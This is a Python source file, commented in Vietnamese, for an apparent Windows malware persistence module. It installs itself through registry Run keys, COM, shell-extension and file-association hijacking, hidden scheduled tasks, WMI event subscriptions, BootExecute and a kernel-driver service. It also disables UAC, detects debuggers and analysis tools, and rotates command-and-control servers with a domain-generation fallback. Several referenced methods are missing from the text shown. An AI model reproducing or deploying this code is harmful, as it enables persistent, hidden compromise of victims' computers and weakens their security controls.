import winreg
import wmi
import os
import sys
import subprocess
import threading
import time
import random
import logging
import psutil
import socket
import requests
import shutil
import json
from datetime import datetime, timedelta 
from typing import List, Dict, Optional, Tuple, Set
from dataclasses import dataclass
from pathlib import Path
from win32com.client import Dispatch
import win32event
import win32service
import win32serviceutil
import win32security
import win32api
import win32con
import win32com.shell.shell as shell
import win32com.client
from win32security import SECURITY_ATTRIBUTES

@dataclass 
class ServerConfig:
    """Cấu hình C2 server"""
    address: str
    port: int
    priority: int = 1
    last_success: Optional[float] = None
    failed_attempts: int = 0

class Persistence:
    def __init__(self):
        self.logger = logging.getLogger('persistence')
        self.startup_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        self.task_name = "SystemService"
        self.service_name = "WinSystemManager" 
        self.wmi_conn = None

        # Process monitoring
        self.watchdog_running = False
        self.recovery_attempts = 0
        self.max_recovery = 5
        self.health_checks = []
        self.last_health_check = 0
        self.health_check_interval = 30
        self.watchdog_threads: List[threading.Thread] = []
        self.process_protection_enabled = False

        # Recovery options
        self.recovery_methods = {
            'restart': self._recover_restart,
            'restore': self._recover_restore,
            'migrate': self._recover_migrate,
            'update': self._recover_update,
            'clone': self._recover_clone,
            'reconfig': self._recover_reconfig
        }

        # Backup và cấu hình
        self.backup_dir = os.path.join(os.getenv('TEMP'), '.backup')
        self.config_dir = os.path.join(os.getenv('APPDATA'), '.config')
        os.makedirs(self.backup_dir, exist_ok=True)
        os.makedirs(self.config_dir, exist_ok=True)

        # Backup C2 servers
        self.servers: List[ServerConfig] = []
        self.current_server: Optional[ServerConfig] = None
        self.server_health_checks: Dict[str, datetime] = {}

        # Registry keys for persistence
        self.reg_keys = [
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
            r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run",
            r"Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs"
        ]

        # Shell extensions for hijacking
        self.shell_extensions = [
            "{000214E6-0000-0000-C000-000000000046}",  # .exe
            "{00021500-0000-0000-C000-000000000046}",  # Start Menu
            "{85F36418-D09A-4F5F-9D32-786D0F4C29A0}"   # User Shell Folders
        ]

        # COM objects for hijacking
        self.com_objects = [
            "{2781761E-28E2-4E8A-A4AB-F6C6A51B25F3}",  # MMC
            "{0A14D3FF-EC53-450F-AA30-FFBC55BE26A2}",  # Task Scheduler
            "{2C941FD1-975B-59BE-A960-9A2A262853A5}"   # Windows Script Host
        ]

        # Load configs
        self._load_server_config()
        self._load_recovery_config()

        # DGA backup domains
        self.dga_seeds = ['secure', 'update', 'service', 'sync', 'cloud']
        self.dga_tlds = ['.com', '.net', '.org', '.info', '.biz']

    def install_all(self) -> Dict[str, bool]:
        """Cài đặt tất cả phương thức persistence"""
        results = {}

        methods = [
            # Registry persistence
            self.install_registry,
            self.install_registry_policies,
            self.install_shell_extensions,
            self.install_com_hijack,
            self.install_service_keys,

            # File system persistence
            self.install_startup,
            self.install_dll_hijack,
            self.install_shell_folder,
            self.install_file_associations,

            # Task scheduling
            self.install_task_scheduler,
            self.install_wmi_event,
            self.install_at_job,
            self.install_custom_triggers,

            # Advanced persistence
            self.install_boot_execute,
            self.install_driver_service,
            self.install_system_policies
        ]

        for method in methods:
            try:
                success, _ = method()
                results[method.__name__] = success
            except Exception as e:
                self.logger.error(f"{method.__name__} failed: {str(e)}")
                results[method.__name__] = False

        # Start protection systems
        self._backup_files()
        self.start_watchdog()
        self.enable_process_protection()

        return results

    def install_registry_policies(self) -> Tuple[bool, str]:
        """Persistence qua Registry Policies"""
        try:
            policy_keys = [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"), 
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
            ]

            for hkey, key_path in policy_keys:
                key = winreg.CreateKey(hkey, key_path)
                winreg.SetValueEx(key, "Shell", 0, winreg.REG_SZ, sys.executable)

            return True, "Registry policies installed successfully"
        except Exception as e:
            return False, f"Registry policies failed: {str(e)}"

    def install_shell_extensions(self) -> Tuple[bool, str]:
        """Persistence qua Shell Extension Hijacking"""
        try:
            for clsid in self.shell_extensions:
                key_path = f"SOFTWARE\\Classes\\CLSID\\{clsid}\\InProcServer32"
                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                winreg.SetValueEx(key, None, 0, winreg.REG_SZ, sys.executable)
                winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")

            return True, "Shell extensions installed successfully"
        except Exception as e:
            return False, f"Shell extensions failed: {str(e)}"

    def install_service_keys(self) -> Tuple[bool, str]:
        """Persistence qua Service Registry Keys"""
        try:
            service_key = winreg.CreateKey(
                winreg.HKEY_LOCAL_MACHINE,
                f"SYSTEM\\CurrentControlSet\\Services\\{self.service_name}"
            )

            winreg.SetValueEx(service_key, "ImagePath", 0, winreg.REG_EXPAND_SZ, sys.executable)
            winreg.SetValueEx(service_key, "Start", 0, winreg.REG_DWORD, 2)  # Automatic start
            winreg.SetValueEx(service_key, "Type", 0, winreg.REG_DWORD, 0x10)  # Win32 Service

            return True, "Service keys installed successfully"
        except Exception as e:
            return False, f"Service keys failed: {str(e)}"

    def install_file_associations(self) -> Tuple[bool, str]:
        """Persistence qua File Association Hijacking"""
        try:
            extensions = ['.txt', '.jpg', '.pdf']
            for ext in extensions:
                key_path = f"SOFTWARE\\Classes\\{ext}file\\shell\\open\\command"
                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                winreg.SetValueEx(key, None, 0, winreg.REG_SZ, f'"{sys.executable}" "%1"')

            return True, "File associations installed successfully"
        except Exception as e:
            return False, f"File associations failed: {str(e)}"

    def install_wmi_event(self) -> Tuple[bool, str]:
        """Persistence qua WMI Event Subscription"""
        try:
            wmi_conn = wmi.WMI()
            
            # Create event filter
            filter_query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
            event_filter = wmi_conn.Win32_EventFilter.Create(
                Name="SystemMonitor",
                EventNameSpace="root\\cimv2",
                QueryLanguage="WQL",
                Query=filter_query
            )

            # Create event consumer
            consumer = wmi_conn.Win32_CommandLineEventConsumer.Create(
                Name="SystemMonitor",
                CommandLineTemplate=sys.executable
            )

            # Bind filter and consumer
            wmi_conn.Win32_FilterToConsumerBinding.Create(
                Filter=event_filter,
                Consumer=consumer
            )

            return True, "WMI event installed successfully"
        except Exception as e:
            return False, f"WMI event failed: {str(e)}"

    def install_at_job(self) -> Tuple[bool, str]:
        """Persistence qua AT Job Scheduling"""
        try:
            # Create AT job running every day
            cmd = f'at 00:00 /every:M,T,W,Th,F,S,Su "{sys.executable}"'
            subprocess.run(cmd, shell=True, check=True)

            return True, "AT job installed successfully"
        except Exception as e:
            return False, f"AT job failed: {str(e)}"

    def install_custom_triggers(self) -> Tuple[bool, str]:
        """Persistence với Custom Task Triggers"""
        try:
            scheduler = win32com.client.Dispatch('Schedule.Service')
            scheduler.Connect()
            root_folder = scheduler.GetFolder('\\')

            task_def = scheduler.NewTask(0)
            task_def.RegistrationInfo.Description = 'System Performance Monitor'

            # Multiple triggers
            triggers = [
                ('TASK_TRIGGER_LOGON', None),  # Logon trigger
                ('TASK_TRIGGER_IDLE', None),   # System idle trigger  
                ('TASK_TRIGGER_EVENT', '''<QueryList>
                    <Query Id="0">
                        <Select Path="System">*[System[Provider[@Name='Microsoft-Windows-Power-Troubleshooter']]]</Select>
                    </Query>
                </QueryList>''')  # Event trigger
            ]

            for trigger_type, condition in triggers:
                trigger = task_def.Triggers.Create(getattr(win32con, trigger_type))
                if condition:
                    trigger.EventLog = condition

            # Set task action
            action = task_def.Actions.Create(win32con.TASK_ACTION_EXEC)
            action.Path = sys.executable

            # Set advanced settings
            task_def.Settings.Enabled = True
            task_def.Settings.Hidden = True
            task_def.Settings.RunOnlyIfNetworkAvailable = True
            task_def.Settings.Priority = 1

            # Register task
            root_folder.RegisterTaskDefinition(
                'SystemMonitor',
                task_def,
                win32con.TASK_CREATE_OR_UPDATE,
                None,
                None,
                win32con.TASK_LOGON_INTERACTIVE_TOKEN
            )

            return True, "Custom triggers installed successfully"
        except Exception as e:
            return False, f"Custom triggers failed: {str(e)}"

    def enable_process_protection(self) -> None:
        """Enable process protection system"""
        if not self.process_protection_enabled:
            try:
                # Set process priority
                psutil.Process().nice(psutil.HIGH_PRIORITY_CLASS)

                # Create mutex to prevent multiple instances
                self.mutex = win32event.CreateMutex(None, 1, "Global\\SystemMonitor")

                # Register process with WMI for monitoring
                self.wmi_conn = wmi.WMI()
                process_id = os.getpid()
                self.wmi_conn.Win32_Process.Create(
                    CommandLine=f"wmic process where ProcessId={process_id} CALL SetPriority 'High Priority'"
                )

                self.process_protection_enabled = True
                self.logger.info("Process protection enabled")

            except Exception as e:
                self.logger.error(f"Failed to enable process protection: {str(e)}")

    def start_watchdog(self) -> None:
        """Start watchdog monitoring system"""
        if not self.watchdog_running:
            # Process monitoring thread
            process_thread = threading.Thread(
                target=self._monitor_process,
                daemon=True
            )
            self.watchdog_threads.append(process_thread)
            process_thread.start()

            # System monitoring thread  
            system_thread = threading.Thread(
                target=self._monitor_system,
                daemon=True
            )
            self.watchdog_threads.append(system_thread)
            system_thread.start()

            # Network monitoring thread
            network_thread = threading.Thread(
                target=self._monitor_network,
                daemon=True  
            )
            self.watchdog_threads.append(network_thread)
            network_thread.start()

            self.watchdog_running = True
            self.logger.info("Watchdog system started")

    def _monitor_process(self) -> None:
        """Monitor process health"""
        while True:
            try:
                process = psutil.Process()
                
                # Check CPU and memory usage
                if process.cpu_percent() > 80 or process.memory_percent() > 75:
                    self._recover_migrate()

                # Check for debugger
                if process.is_running() and win32api.IsDebuggerPresent():
                    self._recover_clone()

                # Check integrity
                if not self._verify_signature(sys.executable):
                    self._recover_restore()

                time.sleep(5)

            except Exception as e:
                self.logger.error(f"Process monitoring error: {str(e)}")
                time.sleep(30)

    def _monitor_system(self) -> None:
        """Monitor system health"""
        while True:
            try:
                # Check system resources
                if psutil.cpu_percent() > 90 or psutil.virtual_memory().percent > 90:
                    self.logger.warning("High system load detected")
                    time.sleep(300)  # Wait for system to stabilize
                    continue

                # Check for analysis tools
                suspicious_processes = [
                    "ida64.exe", "x64dbg.exe", "windbg.exe", "procmon.exe",
                    "process explorer.exe", "autoruns.exe", "tcpview.exe"
                ]
                for proc in psutil.process_iter(['name']):
                    if proc.info['name'].lower() in suspicious_processes:
                        self.logger.warning(f"Analysis tool detected: {proc.info['name']}")
                        self._recover_migrate()

                time.sleep(10)

            except Exception as e:
                self.logger.error(f"System monitoring error: {str(e)}")
                time.sleep(30)

    def _monitor_network(self) -> None:
        """Monitor network connectivity"""
        while True:
            try:
                # Check current C2 server
                if self.current_server:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    result = sock.connect_ex((
                        self.current_server.address,
                        self.current_server.port
                    ))
                    sock.close()

                    if result != 0:
                        self.current_server.failed_attempts += 1
                        if self.current_server.failed_attempts >= 3:
                            self._rotate_server()
                    else:
                        self.current_server.last_success = time.time()
                        self.current_server.failed_attempts = 0

                # Health check backup servers
                self._check_backup_servers()

                time.sleep(self.health_check_interval)

            except Exception as e:
                self.logger.error(f"Network monitoring error: {str(e)}")
                time.sleep(60)

    def _rotate_server(self) -> None:
        """Rotate to next available C2 server"""
        if not self.servers:
            return

        # Sort by priority and failed attempts
        available_servers = sorted(
            self.servers,
            key=lambda x: (x.failed_attempts, -x.priority)
        )

        # Try next server
        for server in available_servers:
            if server != self.current_server:
                self.current_server = server
                self.logger.info(f"Rotated to server: {server.address}")
                break

        # If all servers failed, generate new DGA domains
        if all(s.failed_attempts >= 3 for s in self.servers):
            self._generate_backup_servers()

    def _check_backup_servers(self) -> None:
        """Health check của backup C2 servers"""
        for server in self.servers:
            # Skip recently checked servers
            if server.address in self.server_health_checks:
                last_check = self.server_health_checks[server.address]
                if datetime.now() - last_check < timedelta(minutes=30):
                    continue

            try:
                # Test connection
                response = requests.get(
                    f"http://{server.address}:{server.port}/health",
                    timeout=5
                )
                if response.status_code == 200:
                    server.last_success = time.time()
                    server.failed_attempts = 0
                else:
                    server.failed_attempts += 1

            except:
                server.failed_attempts += 1

            self.server_health_checks[server.address] = datetime.now()

    def _generate_backup_servers(self) -> None:
        """Generate new backup C2 servers using DGA"""
        new_servers = []
        for i in range(5):
            domain = self._generate_dga_domain()
            new_servers.append(ServerConfig(
                address=domain,
                port=random.randint(1024, 65535),
                priority=i + 1
            ))

        self.servers = new_servers
        self.current_server = new_servers[0]

    def install_boot_execute(self) -> Tuple[bool, str]:
        """Persistence qua Boot Execute"""
        try:
            key = winreg.CreateKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Control\Session Manager"
            )
            
            # Add to boot execute
            value = winreg.QueryValueEx(key, "BootExecute")[0]
            if isinstance(value, str):
                value = [value]
            if sys.executable not in value:
                value.append(sys.executable)
            winreg.SetValueEx(key, "BootExecute", 0, winreg.REG_MULTI_SZ, value)

            return True, "Boot execute installed successfully"
        except Exception as e:
            return False, f"Boot execute failed: {str(e)}"

    def install_driver_service(self) -> Tuple[bool, str]:
        """Persistence qua Driver Service"""
        try:
            # Create service in legacy driver mode
            win32serviceutil.InstallService(
                self.service_name,
                self.service_name,
                win32service.SERVICE_KERNEL_DRIVER,
                exeName=sys.executable
            )

            # Set driver service parameters
            key = winreg.CreateKey(
                winreg.HKEY_LOCAL_MACHINE,
                f"SYSTEM\\CurrentControlSet\\Services\\{self.service_name}"
            )
            
            winreg.SetValueEx(key, "Type", 0, winreg.REG_DWORD, 1)  # Kernel driver
            winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, 0)  # Boot start
            winreg.SetValueEx(key, "ErrorControl", 0, winreg.REG_DWORD, 1)  # Normal error handling

            return True, "Driver service installed successfully"
        except Exception as e:
            return False, f"Driver service failed: {str(e)}"

    def install_system_policies(self) -> Tuple[bool, str]:
        """Persistence qua System Policy Modifications"""
        try:
            # Modify security policies
            key = winreg.CreateKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            )

            policies = {
                "EnableLUA": 0,                    # Disable UAC
                "ConsentPromptBehaviorAdmin": 0,   # No prompt
                "PromptOnSecureDesktop": 0,       # Disable secure desktop
                "EnableInstallerDetection": 0,     # Disable installer detection
                "EnableSecureUIAPaths": 0,        # Disable secure UI paths
                "FilterAdministratorToken": 0      # Disable admin token filtering
            }

            for name, value in policies.items():
                winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, value)

            # Add to LSA authentication packages
            lsa_key = winreg.CreateKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Control\Lsa"
            )
            
            auth_packages = winreg.QueryValueEx(lsa_key, "Authentication Packages")[0]
            if sys.executable not in auth_packages:
                auth_packages.append(os.path.basename(sys.executable))
                winreg.SetValueEx(
                    lsa_key,
                    "Authentication Packages",
                    0,
                    winreg.REG_MULTI_SZ,
                    auth_packages
                )

            return True, "System policies modified successfully"
        except Exception as e:
            return False, f"System policies failed: {str(e)}"